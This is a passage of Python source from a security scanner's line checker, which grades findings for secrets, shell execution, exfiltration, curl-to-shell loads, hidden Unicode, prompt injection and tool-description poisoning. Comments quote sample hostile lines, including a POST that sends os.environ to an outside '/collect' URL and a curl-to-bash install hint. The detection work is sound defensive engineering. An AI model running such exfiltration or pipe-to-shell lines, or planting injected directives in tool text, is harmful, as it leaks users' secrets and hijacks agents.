    lf = LineFilter(content)

    def _found(rx: re.Pattern[str]) -> bool:
        """``bool(rx.search(content))`` (``LineFilter.search`` returns the same match)."""
        return lf.search(rx) is not None

    # Precision pass #6: lines inside a Python docstring / multi-line string are prose
    # for the CODE pattern groups (exec, deserialization, fs, remote-load, exfil,
    # obfuscation). Secrets, hidden unicode and prompt injection still scan them.
    # ``(prose_lines, tpl_continuation)``, computed on first use: a file with no line a
    # code rule can match never needs it.
    string_state: list[set[int]] = []

    def _string_state() -> list[set[int]]:
        if not string_state:
            if file_lang == "python":
                string_state.extend((_python_prose_lines(content), set()))
            elif file_lang in ("javascript", "typescript"):
                string_state.extend(_js_string_state(content))
            else:
                string_state.extend((set(), set()))
        return string_state

    sink_memo: list[bool] = []
    # package.json only: the parsed ``scripts`` table, memoized ([None] = unparseable).
    pkg_scripts: list[npm_scripts.ScriptsInfo | None] = []

    def _file_has_exec_sink() -> bool:
        """``_FILE_EXEC_SINK_RE`` on the file's code lines (docstrings and whole-line
        comments that only MENTION ``subprocess.Popen`` don't count). Memoized."""
        if not sink_memo:
            prose = _string_state()[0]
            sink_memo.append(any(
                _FILE_EXEC_SINK_RE.search(ln) for i, ln in enumerate(lines)
                if i not in prose and not ln.lstrip().startswith(("#", "//", "*"))))
        return sink_memo[0]

    # Untrusted-input lines (request body / fetched content) for the "dynamic argv or
    # eval NEXT TO untrusted input" rules.
    untrusted = _untrusted_lines(lines, lf.lines(UNTRUSTED_INPUT_RE))
    js_cp_call_re = _js_cp_call_re(content) if file_lang != "python" else None
    has_cli_import = file_lang == "python" and _found(_CLI_IMPORT_RE)
    # The two JS helpers below are read only when a JS exec call is classified, so
    # they are computed on first use (each is a pure function of the file).
    js_lazy: dict[str, object] = {}

    def _js_cli() -> object:
        if "cli" not in js_lazy:
            js_lazy["cli"] = (_js_cli_expr_checker(content, lines)
                              if file_lang in ("javascript", "typescript") else None)
        return js_lazy["cli"]

    # Precision PR 2: a bare JS `exec(` / `spawn(` / `fork(` is child_process only when
    # the file references the module at all — otherwise it is a local function (a
    # wrapAnsi helper, a `$exec` RegExp binding, an `exec` callback parameter).
    js_has_child_process = file_lang != "python" and "child_process" in content

    def _js_local_cp_names() -> object:
        if "local" not in js_lazy:
            js_lazy["local"] = (
                {n for n in _JS_AMBIGUOUS_CP if _js_defines_locally(content, n)}
                if file_lang != "python" and not js_has_child_process else set()
            )
        return js_lazy["local"]

    # A TypeScript declaration file is types only: no code runs from it.
    is_declaration = file_path.lower().endswith((".d.ts", ".d.mts", ".d.cts"))
    # Lines swallowed by a multi-line exec call already classified at its first line —
    # the per-line `shell=True` rule must not double-report inside that call.
    consumed_until = -1
    suppressed_lines: set[int] = set()

    # Inline Rust unit tests (`#[cfg(test)] mod tests { … }`) compile only for
    # `cargo test`: lines inside them are graded like a file under tests/.
    test_lines: set[int] = set()
    if file_lang == "rust" and not file_test_or_doc:
        from src.scanner.rust_tests import rust_test_lines
        test_lines = rust_test_lines(content)

    # Per-line rule lists: each group's rules, minus those whose regex cannot match the
    # line (it lacks every literal the regex requires; see src/scanner/prefilter.py),
    # and, in the groups whose loop drops a language-tagged rule right after its search
    # matches, minus the rules for other languages. Each loop below skips a rule whose
    # search finds nothing, so trying only these rules gives the same findings.
    def _other_lang(rule: tuple) -> bool:
        return not _lang_ok(rule[0], file_lang)

    exec_rules = UNSAFE_EXEC_PATTERNS
    if js_cp_call_re is not None:
        # "execSync / spawn (Node.js)" also fires on a call through a child_process
        # alias; its line set is the union of both regexes' lines.
        exec_rules = [
            (n, AnyOf(p, js_cp_call_re), s) if n == "execSync / spawn (Node.js)"
            else (n, p, s) for n, p, s in UNSAFE_EXEC_PATTERNS]
    plans = [
        lf.plan(SECRET_PATTERNS),
        lf.plan(exec_rules, _other_lang),
        lf.plan(INSECURE_DESERIALIZATION_PATTERNS, _other_lang),
        lf.plan(FS_ACCESS_PATTERNS, _other_lang),
        lf.plan(EXFILTRATION_PATTERNS),
        lf.plan(DYNAMIC_REMOTE_LOAD_PATTERNS, _other_lang),
        lf.plan(INVISIBLE_UNICODE_PATTERNS),
        lf.plan(PROMPT_INJECTION_PATTERNS + (
            METADATA_INJECTION_PATTERNS if (is_metadata or metadata_text) else [])),
        lf.plan(OBFUSCATION_PATTERNS),
    ]
    (secret_plan, exec_plan, deser_plan, fs_plan, exfil_plan, remote_plan, unicode_plan,
     injection_plan, obfuscation_plan) = ((p.table.get, p.default) for p in plans)
    # Text an agent reads as prose (SKILL.md, AGENTS.md, a served tool description):
    # `#` / `*` lines there are headings and bullets, not comments.
    markdown_like = (is_metadata or metadata_text
                     or Path(file_path).suffix.lower() in (".md", ".mdx", ".markdown"))

    def _check_unicode(line: str, idx: int, stripped: str, *, in_comment: bool) -> None:
        """Invisible / smuggled Unicode on one line (one finding per line)."""
        for name, pattern, severity in unicode_plan[0](idx, unicode_plan[1]):
            if in_comment and name.startswith("Zero-width"):
                # A stray ZWSP pasted into a comment (`≥ 3.12.<ZWSP>`) changes no code
                # and hides nothing; a RUN of zero-width characters is the hidden-text
                # (steganography) shape, the same bar as shipped markdown.
                if ZERO_WIDTH_RUN_RE.search(line) and not _is_allowlisted(
                        file_path, ZERO_WIDTH_RUN_NAME, allowlist):
                    findings.append(Finding(
                        category="hidden_unicode", name=ZERO_WIDTH_RUN_NAME, severity="medium",
                        file_path=file_path, line_number=idx + 1, snippet=stripped[:120]))
                    break
                continue
            if pattern.search(line) and not _benign_unicode_only(name, pattern, line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                effective_severity = severity
                if name.startswith("Bidirectional") and _bidi_cannot_reorder_code(
                        line, in_comment or idx in _string_state()[0], file_lang):
                    # Trojan Source deceives a human reading CODE: the reordering is per
                    # line. A line wholly inside a docstring / template / comment has no
                    # code to reorder (bandit documents the attack in one); a minified
                    # bundle line is not read by a reviewer (precision PR 2). A comment
                    # line that opens or closes a block comment keeps its severity: the
                    # "commenting-out" variant (`/*<RLO> } <LRI>if (admin)<PDI> */`).
                    effective_severity = "low"
                findings.append(Finding(
                    category="hidden_unicode",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=idx + 1,
                    snippet=stripped[:120],
                ))
                break

    declares_tools_memo: list[bool] = []

    def _declares_tools() -> bool:
        if not declares_tools_memo:
            declares_tools_memo.append(_found(SSRF_TOOL_SURFACE_RE))
        return declares_tools_memo[0]

    def _check_injection(line: str, idx: int, stripped: str) -> None:
        """Prompt injection / tool poisoning on one line (one finding per line)."""
        # Check prompt injection / tool-description poisoning (metadata files also get the
        # wider tool-poisoning shapes that would be noisy on code lines).
        for name, pattern, severity in injection_plan[0](idx, injection_plan[1]):
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # Downgrade in test/doc/infra files — EXCEPT manifest/skill metadata,
                # which is the actual attack surface (a poisoned description is not a doc).
                effective_severity = severity
                if is_downgraded and not is_metadata and severity in ("critical", "high"):
                    effective_severity = "medium"
                # Precision PR 2: a bare `<instructions>` / `</system>` tag in a library's
                # OWN prompt template (langchain's summarization prompt) structures text
                # it sends to its own model call. It is a high only where an agent reads
                # it as a tool definition: metadata files and files that declare tools.
                if (name == "Injected system/role directive" and effective_severity == "high"
                        and not (is_metadata or metadata_text)
                        and all(_INJECTION_TAG_ONLY_RE.fullmatch(mm.group(0))
                                for mm in pattern.finditer(line))):
                    if not _declares_tools():
                        effective_severity = "medium"
                # A "System prompt:" LABEL whose only content is a format placeholder
                # (`"failed to prepend system prompt: %s"`, `f"System prompt:\n{sp}"`)
                # carries no instruction itself: medium, never blocking.
                if (name == "Injected system/role directive" and effective_severity == "high"
                        and not (is_metadata or metadata_text)
                        and _system_prompt_label_only(line, pattern)):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="prompt_injection",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=idx + 1,
                    snippet=stripped[:120],
                ))
                return

    # A line no rule can match does nothing in the loop below unless it carries the
    # suppression marker (counted even when nothing matches), so only these lines run.
    if any(p.always_active for p in plans):
        scan_idxs: list[int] | range = range(len(lines))
    else:
        scan_idxs = sorted(set().union(
            *(p.table for p in plans), lf.lines_containing(_SUPPRESSION_COMMENT)))

    for idx in scan_idxs:
        line = lines[idx]
        line_num = idx + 1
        secret_rules = secret_plan[0](idx, secret_plan[1])
        exec_rules_here = exec_plan[0](idx, exec_plan[1])
        deser_rules = deser_plan[0](idx, deser_plan[1])
        fs_rules = fs_plan[0](idx, fs_plan[1])
        exfil_rules = exfil_plan[0](idx, exfil_plan[1])
        remote_rules = remote_plan[0](idx, remote_plan[1])
        obfuscation_rules = obfuscation_plan[0](idx, obfuscation_plan[1])
        if test_lines:
            in_test = idx in test_lines
            is_test_or_doc = file_test_or_doc or in_test
            is_downgraded = file_downgraded or in_test
        # Comment lines (basic heuristic) skip every rule group but hidden Unicode: an
        # invisible / bidi character in a comment is still Trojan Source and still
        # smuggles text past a reviewer to whoever (or whatever agent) reads the file.
        # Prompt-injection rules stay off in code comments (no agent reads a comment as
        # an instruction to it; a security library documents the phrases there). In
        # markdown-like agent text (SKILL.md / AGENTS.md / a tool description) `#` and
        # `*` open headings and bullets, which ARE the text an agent reads: no skip.
        # (Code rule groups stay off on those lines, as before.)
        stripped = line.strip()
        if stripped.startswith(("#", "//", "*", "/*")):
            _check_unicode(line, idx, stripped, in_comment=not markdown_like)
            if markdown_like:
                _check_injection(line, idx, stripped)
            continue
        # Only the code groups read is_prose, and a line none of their regexes matches
        # gives no finding either way: those lines skip the groups (and the
        # string-state pass is never needed for them).
        code_rules = (exec_rules_here, deser_rules, fs_rules, exfil_rules, remote_rules,
                      obfuscation_rules)
        if any(code_rules) and not any(
                rule[1].search(line) for group in code_rules for rule in group):
            exec_rules_here = deser_rules = fs_rules = ()
            exfil_rules = remote_rules = obfuscation_rules = ()
            is_prose = False
        else:
            is_prose = any(code_rules) and (idx in _string_state()[0] or is_declaration)
        # NOTE: (#6) we deliberately do NOT skip an entire line just because it contains
        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
        # `# example` and silently ignored real code like
        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
        # handling is now scoped to the matched secret VALUE only (see the secret loop).

        # --- Option 1: Inline suppression ---
        # If the line contains "ag-scan:ignore", it suppresses LOW/MEDIUM findings
        # (legitimate false-positive silencing) — but it can NOT hide a critical/high:
        # a suppression comment on a line that matches a critical/high pattern falls
        # through to normal processing (which still applies allowlist/context/lang and
        # then emits the finding), so hiding a real critical with a one-line comment is
        # no longer free. Every suppression still counts toward the suppression penalty.
        if _SUPPRESSION_COMMENT in line:
            suppressed_count += 1
            suppressed_lines.add(line_num)
            if not _line_has_blocking_match(line, file_lang):
                continue
            # else: fall through — the critical/high finding is created below.

        # Check secrets
        for name, pattern, severity in secret_rules:
            match = pattern.search(line)
            if match:
                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
                # The captured secret value (group 1 when present, else the full match).
                val = match.group(1) if match.groups() else match.group()
                # Collapse separators/case so "CHANGE-ME-IN-PRODUCTION", "change_me",
                # "your-api-key" all reduce to a comparable core before matching.
                val_norm = re.sub(r"[^a-z0-9]", "", val.lower())
                if (any(tok in val_norm for tok in _SECRET_PLACEHOLDER_CORES)
                        or _is_counting_placeholder(val)
                        or _is_fake_fixture_secret(val_norm, file_path)):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # A DISTINCTIVE provider secret (AWS/GitHub/private key/…) in a test/doc
                # file is a real leak — surface it, downgraded, instead of hiding it
                # (dropping test/doc secrets entirely made a genuine leaked key invisible).
                # A GENERIC "api_key = <random>" in a tutorial is almost always an example,
                # so it stays skipped there to avoid noise. Placeholder + allowlist filters
                # (above) already removed the obvious fakes.
                sev = severity
                secret_payload = False
                if is_test_or_doc:
                    if name.startswith("Generic"):
                        continue
                    if payload_mode and name in _PAYLOAD_SECRET_NAMES:
                        secret_payload = True
                    else:
                        sev = "medium" if severity in ("critical", "high") else "low"
                # Precision pass #4: a generic key must LOOK like a credential (entropy,
                # letters+digits, no path separator) — `TOKEN = "auth-request-type/at"`
                # is a protocol constant, not a secret.
                if name == "Generic API Key assignment" and not _generic_secret_plausible(val):
                    continue
                # Precision PR 2: a key the NAME says is a shipped default / public /
                # demo value (ethers' `defaultApiKey` for its community endpoints) is
                # published on purpose: reported, medium, not a leaked credential.
                if (name == "Generic API Key assignment" and sev == "high"
                        and _SHARED_KEY_NAME_RE.search(
                            _assigned_identifier(line, match.start()))):
                    sev = "medium"
                # A value introduced as an example inside help text ("…access logs.
                # Example api_key='d5345c…'" in a FastAPI Query description) is
                # documentation: reported, medium, never blocking.
                if (name == "Generic API Key assignment" and sev == "high"
                        and _is_documented_example(line, match.start())
                        and not _LIVE_KEY_PREFIX_RE.match(val)):
                    sev = "medium"
                # Precision pass #3: a PEM HEADER with no key body is key-HANDLING code
                # (marker tuples, startswith(), regexes) — reported as a capability.
                if name == "Private Key block" and not _pem_has_body(lines, idx, match.end()):
                    findings.append(Finding(
                        category="secret",
                        name="Private Key block marker (no key body)",
                        severity="info",
                        file_path=file_path,
                        line_number=line_num,
                        snippet=stripped[:120],
                        kind="capability",
                        capability="secret:pem_handling",
                    ))
                    break
                findings.append(Finding(
                    category="secret",
                    name=name,
                    severity=sev,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=_redact_secret(stripped[:120], match),
                    payload=secret_payload,
                ))
                break  # one finding per line for secrets

        # Check unsafe exec (code group — skipped in docstrings; and a `def eval(` is a
        # definition, not the builtin).
        if exec_rules_here and not is_prose and not _DEF_EVAL_EXEC_RE.search(stripped):
            for name, pattern, severity in exec_rules_here:
                pattern = getattr(pattern, "first", pattern)
                if not pattern.search(line) and not (
                    name == "execSync / spawn (Node.js)"
                    and js_cp_call_re is not None and js_cp_call_re.search(line)
                ):
                    continue
                # Language dispatch (#2): skip a language-specific pattern on a
                # non-matching file (e.g. Python exec() on a .mjs file).
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check (eval/exec exemptions) ---
                if _is_safe_exec_context(line, name, file_path):
                    continue
                # Inside a multi-line call already classified above (its `shell=True`
                # line, say): never double-report.
                if idx <= consumed_until and name == "shell=True (Python)":
                    continue
                effective_severity = severity
                kind = "defect"
                capability = ""
                label = ""
                verdict = None
                payload = False
                if name == "child_process (Node.js)":
                    # Importing child_process is a capability; the calls are what count.
                    # One finding per line: when this line also CALLS through the module
                    # (`require('child_process').exec(...)`), let the call rule classify it.
                    if js_cp_call_re is not None and js_cp_call_re.search(line):
                        continue
                    verdict = ("capability", "info", "imports child_process", "process:spawn")
                elif name == "shell=True (Python)":
                    # A `shell=True` the call classifier did not read (a wrapper such as
                    # `trio.lowlevel.open_process`, a bare `Popen`): a shell IS invoked,
                    # so it stays a defect — critical only next to untrusted input, the
                    # same rule the classifier applies. Text inside a string literal
                    # (an error message) is not a keyword argument.
                    sm = pattern.search(line)
                    if sm and _in_py_string_literal(line, sm.start()):
                        continue
                    # `def runcmd(cmd, shell=True):` is a parameter default, not a call;
                    # the call inside the function is classified on its own line.
                    if re.match(r"\s*(?:async\s+)?def\s", line):
                        continue
                    stmt = "\n".join(lines[max(0, idx - 6): idx + 1])
                    near = _near(untrusted, idx, _UNTRUSTED_WINDOW)
                    if near and _untrusted_flows(lines, idx, stmt, untrusted):
                        verdict = ("defect", "critical",
                                   "shell=True on untrusted input", "")
                        payload = True
                    elif near or _decoded_flows(lines, idx, stmt):
                        verdict = ("defect", "high", "shell=True runs a shell command next "
                                   "to untrusted input or a decoded value", "")
                        # A decoded value reaching the shell is the payload; untrusted
                        # input merely nearby is not.
                        payload = not near or _decoded_flows(lines, idx, stmt)
                    else:
                        # Precision PR 2 ladder: a wrapper's shell=True with nothing
                        # untrusted in reach is a medium.
                        verdict = ("defect", "medium", "shell=True runs a shell command (no "
                                   "untrusted input in reach)", "")
                elif name in ("subprocess.run / Popen (Python)", "os.system / os.popen (Python)"):
                    m = _PY_EXEC_CALL_RE.search(line)
                    if m:
                        v = _classify_exec_match(lines, idx, m, file_lang, untrusted,
                                                 has_cli_import)
                        verdict = (v.kind, v.severity, v.label, v.capability)
                        payload = v.payload
                        consumed_until = max(consumed_until, idx + v.consumed_lines - 1)
                elif name == "execSync / spawn (Node.js)":
                    cands = list(_JS_EXEC_CALL_RE.finditer(line)) + (
                        list(js_cp_call_re.finditer(line)) if js_cp_call_re is not None else [])
                    tpl_in = "`" if idx in _string_state()[1] else None
                    code_hits = [c for c in cands
                                 if not _js_call_is_text_or_def(line, c.start(), tpl_in)]
                    if cands and not code_hits:
                        # Only inside a string / comment (`'Use the RegExp#exec() method'`,
                        # `} // execSync()`) or a definition (`function execSync(cmd) {`).
                        continue
                    m = min(code_hits, key=lambda c: c.start()) if code_hits else None
                    if (m and m.group(1) in _js_local_cp_names()
                            and m.group(0).startswith(m.group(1))):
                        continue  # a local exec()/spawn()/fork(), not child_process
                    if m:
                        v = _classify_exec_match(lines, idx, m, file_lang, untrusted,
                                                 js_cli=_js_cli())
                        verdict = (v.kind, v.severity, v.label, v.capability)
                        payload = v.payload
                        consumed_until = max(consumed_until, idx + v.consumed_lines - 1)
                elif name in ("eval() call (Python)", "exec() call (Python)"):
                    m = _PY_EVAL_CALL_RE.search(line)
                    if m:
                        v = _classify_eval_match(lines, idx, m, untrusted)
                        if v is None:
                            break  # reported by the obfuscation rule on this line
                        verdict = (v.kind, v.severity, v.label, v.capability)
                        payload = v.payload
                if verdict is not None:
                    kind, effective_severity, label, capability = verdict
                # Downgrade severity in test/doc/infra files (defects only)
                effective_severity, payload = _graded(kind, effective_severity, payload)
                findings.append(Finding(
                    category="unsafe_exec",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=_why(label, "unsafe_exec", kind),
                    kind=kind,
                    capability=capability,
                    payload=payload,
                ))
                break

        # Check insecure deserialization (#7) — RCE class; NOT discounted for MCP.
        # pickle/marshal/dill of a LOCAL source (own cache, caller-chosen protocol) is a
        # capability; next to untrusted input it stays the original high. yaml.load /
        # allow_pickle / torch.load are unchanged.
        if not is_prose:
            for name, pattern, severity in deser_rules:
                if not pattern.search(line):
                    continue
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                effective_severity = severity
                kind = "defect"
                capability = ""
                label = ""
                if name.startswith("numpy.load allow_pickle") and not _NP_LOAD_CTX_RE.search(
                        "\n".join(lines[max(0, idx - 3): idx + 1])):
                    # `def save(file, arr, allow_pickle=True)`: a parameter default or a
                    # SAVE call writes a pickle; only a load call reads one (PR 2).
                    continue
                if name.startswith("yaml.load") and _ruamel_safe_receiver(content, line):
                    # ruamel.yaml's `YAML()` loads round-trip (safe) unless typ='unsafe'.
                    continue
                if _PY_DESER_CALL_RE.search(line) and not _near(untrusted, idx, _UNTRUSTED_WINDOW):
                    kind, effective_severity, capability = "capability", "low", "data:deserialize"
                    label = "deserializes pickle/marshal data from a local source"
                elif _PY_DESER_CALL_RE.search(line) and not _untrusted_flows(
                        lines, idx, line, untrusted):
                    # Flow, not proximity (precision PR 2): scipy unpickles a file a
                    # `.fetch()` 40 lines away downloaded (in another function). A
                    # medium; high when the fetched value reaches the load.
                    effective_severity = "medium"
                    label = ("deserializes pickle/marshal data in a file that reads untrusted "
                             "input (no flow to the call found)")
                # Untrusted input reaching a pickle/marshal load is the payload shape
                # (the two branches above took every other pickle/marshal call).
                effective_severity, payload = _graded(
                    kind, effective_severity, bool(_PY_DESER_CALL_RE.search(line)))
                findings.append(Finding(
                    category="insecure_deserialization",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=_why(label, "insecure_deserialization", kind),
                    kind=kind,
                    capability=capability,
                    payload=payload,
                ))
                break

        # Check file system access
        if not is_prose:
            for name, pattern, severity in fs_rules:
                if not pattern.search(line):
                    continue
                # Language dispatch (#2)
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check ---
                if _is_safe_fs_context(line, name, file_path):
                    continue
                effective_severity = severity
                kind = "defect"
                capability = ""
                label = ""
                if name == "rmrf / recursive delete":
                    m = _RMTREE_CALL_RE.search(line)
                    if m and not _rmtree_is_dangerous(lines, idx, m):
                        kind, effective_severity = "capability", "low"
                        capability = "filesystem:delete"
                        label = "deletes a directory tree (non-root path)"
                    else:
                        label = "recursive delete of a root/home path"
                elif name in _FS_RW_RULES and not _near(untrusted, idx, _UNTRUSTED_WINDOW):
                    # Reading / writing a caller- or config-named path is what a file
                    # tool does (paramiko's save_host_keys, pytest's --junitxml). Next
                    # to untrusted input (request body → open(path)) it stays a medium.
                    is_write = "write" in name.lower() or re.search(
                        r"""writeFile|['"][wax]b?\+?['"]""", line) is not None
                    capability = "filesystem:write" if is_write else "filesystem:read"
                    kind, effective_severity = "capability", "low"
                    label = ("writes a file at a runtime path" if is_write
                             else "reads a file at a runtime path")
                # Downgrade severity in test/doc/infra files
                if (kind == "defect" and is_downgraded
                        and effective_severity in ("critical", "high")):
                    effective_severity = "medium"
                # Downgrade for safer pathlib patterns
                if kind == "defect":
                    effective_severity = _downgrade_fs_severity(line, effective_severity)
                findings.append(Finding(
                    category="fs_access",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=_why(label, "fs_access", kind),
                    kind=kind,
                    capability=capability,
                ))
                break

        # Check data exfiltration
        for name, pattern, severity in exfil_rules:
            if is_prose:
                break
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                if name == "HTTP POST with sensitive data" and _py_local_fetch_only(
                        line, file_lang):
                    continue
                if (name == "HTTP POST with sensitive data"
                        and _only_fetch_credentials_option(line, pattern)):
                    continue
                # A tunnel host in a host / origin ALLOWLIST (Vite `allowedHosts`,
                # Django `ALLOWED_HOSTS`) is what a server accepts, not where data goes.
                if name == "Outbound webhook/exfil URL":
                    keys = _host_allowlist_entry(lines, idx, pattern)
                    if keys:
                        # Reported low; the caller restores it when another file of
                        # the tree reads the allowlist (settings.ALLOWED_HOSTS[0]).
                        f_low = Finding(
                            category="exfiltration", name=name, severity="low",
                            file_path=file_path, line_number=line_num,
                            snippet=stripped[:120])
                        npm_scripts.mark_allowlist(f_low, severity, keys)
                        findings.append(f_low)
                        continue
                # OAuth2 token exchange (client_secret/grant_type → token endpoint)
                # is the required auth flow, not a leak. Relax ONLY the generic
                # "POST with sensitive data" rule; the stronger critical exfil
                # patterns (env dump, webhook.site, DNS) are never relaxed.
                if (name == "HTTP POST with sensitive data"
                        and _looks_like_oauth(lines, line_num)):
                    continue
                # Exfil is not downgraded; in a downgraded artifact file the payload
                # shapes are also graded as shipped code.
                exfil_payload = payload_mode and is_downgraded and (
                    name in _PAYLOAD_EXFIL_NAMES or any(
                        _CREDENTIAL_FILE_RE.search(ln) for ln in lines[
                            max(0, idx - _CREDENTIAL_WINDOW): idx + _CREDENTIAL_WINDOW + 1]))
                findings.append(Finding(
                    category="exfiltration",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    payload=exfil_payload,
                ))
                break

        # Check dynamic remote payload / rug-pull (external-URL-swap)
        for name, pattern, severity in remote_rules:
            if is_prose:
                break
            dm = pattern.search(line)
            if dm:
                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # An `npx …` / branch-URL hint inside a string literal (an error
                # message, a docstring line) is advice to a human, not a load.
                if name.startswith("Unpinned") and _in_prose_string_at(
                        line, dm.start(), "`" if idx in _string_state()[1] else None) \
                        and not _RUN_CALL_RE.search(line[:dm.start()]):
                    # (`execSync('cd x && echo hi && npx foo')` reads like words but is
                    # run: recall review of #24.)
                    continue
                # A mutable branch URL is a rug-pull only when something LOADS it
                # (fetch/urlopen/curl/pip/import within 2 lines); a `$id`, homepage
                # or docs link is reported as low.
                effective_severity = severity
                if (name.startswith("Unpinned remote resource")
                        and not _has_loader_context(lines, idx, dm.start())):
                    effective_severity = "low"
                # Downgrade in test/doc/infra files like other groups
                effective_severity, remote_payload = _graded(
                    "defect", effective_severity, name in _PAYLOAD_REMOTE_LOAD_NAMES)
                # A pipe-to-shell STRING in a shipped test file (a security test's sample
                # attack input, nltk) is data unless the file can run a command: then it
                # is graded like any other downgraded finding (medium, non-blocking).
                if (remote_payload and name == "curl/wget piped to shell"
                        and Path(file_path).suffix.lower() not in _SHELL_PAYLOAD_EXTS
                        and _in_string_literal_at(line, dm.start())
                        and not _file_has_exec_sink()):
                    effective_severity, remote_payload = "medium", False
                if name.startswith("Unpinned npx") and _npx_not_a_load(
                        file_path, line, dm.start(),
                        "`" if idx in _string_state()[1] else None, lines, idx):
                    # Help text a CLI prints (`'  npx browserslist\n'`) or a maintainer
                    # package.json script (`"release": "npx npmpub"`) never runs on a
                    # consumer's machine (precision PR 2).
                    effective_severity = "low"
                if name.startswith("vm.runInContext"):
                    # Precision PR 2: classified like eval(). A constant script
                    # (`vm.runInContext("this", ctx)`) or code with no untrusted input in
                    # reach (jsdom running a page's own scripts, a test runner's module
                    # evaluator) is a capability; untrusted input reaching it is high.
                    vk, vsev, vlabel = _classify_vm_match(lines, idx, dm, untrusted)
                    # A vm defect at high runs decoded or untrusted code; a constant
                    # script is a payload only when it downloads / decodes AND runs.
                    from src.scanner.exec_classify import inline_code_is_payload
                    vsev, vm_payload = _graded(
                        vk, vsev, not vlabel.startswith("runs a constant script")
                        or inline_code_is_payload(line))
                    findings.append(Finding(
                        category="dynamic_remote_load",
                        name=name,
                        severity=vsev,
                        payload=vm_payload,
                        file_path=file_path,
                        line_number=line_num,
                        snippet=stripped[:120],
                        remediation=_why(vlabel, "dynamic_remote_load", vk),
                        kind=vk,
                        capability="code:eval" if vk == "capability" else "",
                    ))
                    break
                # A one-time installer piping a remote script to the shell is how the
                # tool is delivered, reported as what it does, not as a defect.
                if is_installer and name == "curl/wget piped to shell":
                    from src.scanner.exec_classify import CAP_INSTALLER
                    findings.append(Finding(
                        category="dynamic_remote_load",
                        name=name,
                        severity="low",
                        file_path=file_path,
                        line_number=line_num,
                        snippet=stripped[:120],
                        kind="capability",
                        capability=CAP_INSTALLER,
                    ))
                    break
                if name == "curl/wget piped to shell" and file_lang in (
                        "javascript", "typescript", "python") and not is_declaration:
                    from src.scanner import printed_hint
                    if printed_hint.hint_only({file_path: content}, file_path, line_num,
                                              pattern, package=False):
                        # A string the code prints / logs / puts in an error message
                        # and never runs (pm2's "Install NVM: $ curl … | bash").
                        hint = Finding(
                            category="dynamic_remote_load",
                            name=name,
                            severity="low",
                            file_path=file_path,
                            line_number=line_num,
                            snippet=stripped[:120],
                            remediation=printed_hint.WHY,
                        )
                        # What it would have been: a package scan re-checks it with
                        # every file in view and restores this when that fails
                        # (`calibrate_package_findings`). Not a dataclass field, so it
                        # never reaches serialized output. (severity, payload, remediation)
                        hint.pre_hint = (effective_severity, remote_payload,
                                         _REMEDIATION_HINTS["dynamic_remote_load"])
                        findings.append(hint)
                        break
                finding = Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    payload=remote_payload,
                )
                if (name == "curl/wget piped to shell"
                        and Path(file_path).name.lower() == "package.json"):
                    # A maintainer-only package.json script (`test:e2e:docker`) that no
                    # install lifecycle script reaches never runs for a consumer. The
                    # caller re-checks the tree for a file that runs it
                    # (npm_scripts.restore_externally_invoked).
                    owners = _maintainer_script_owners(content, pkg_scripts, idx, line,
                                                       pattern)
                    if owners:
                        npm_scripts.mark_maintainer(finding, owners)
                findings.append(finding)
                break

        # Check invisible / smuggled Unicode (dangerous anywhere — no downgrade)
        _check_unicode(line, idx, stripped, in_comment=False)

        _check_injection(line, idx, stripped)

        # Check code obfuscation
        for name, pattern, severity in obfuscation_rules:
            if is_prose:
                break
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                effective_severity = severity
                kind = "defect"
                capability = ""
                emitted_name = name
                if (name == "Dynamic import with variable"
                        and not _near(untrusted, idx, _UNTRUSTED_WINDOW)):
                    # Plugin / backend loading by name (pytest, requests.packages) is
                    # what the tool does; next to untrusted input it stays a medium.
                    kind, effective_severity, capability = "capability", "low", "code:eval"
                if name == "Hex-encoded string execution":
                    # Precision pass #5: a long `\x..` run is only EXECUTION with an
                    # exec/decode sink within 3 lines; Rust/Go/Java byte constants are
                    # skipped; a plain byte literal is an informational capability.
                    if file_lang in _HEX_SKIP_LANGS:
                        break
                    lo = max(0, idx - _HEX_SINK_WINDOW)
                    hi = min(len(lines), idx + _HEX_SINK_WINDOW + 1)
                    # Bounded by characters too (precision PR 2): on a minified bundle
                    # line every sink in the file is "within 3 lines".
                    hm = pattern.search(line)
                    near_txt = (("\n".join(lines[lo:idx]))[-_HEX_SINK_CHARS:] + "\n"
                                + line[max(0, hm.start() - _HEX_SINK_CHARS):
                                       hm.end() + _HEX_SINK_CHARS] + "\n"
                                + ("\n".join(lines[idx + 1:hi]))[:_HEX_SINK_CHARS])
                    if not _HEX_SINK_RE.search(near_txt):
                        kind, effective_severity = "capability", "info"
                        capability = "binary:hex_literal"
                        emitted_name = "Long hex-escaped byte literal"
                findings.append(Finding(
                    category="obfuscation",
                    name=emitted_name,
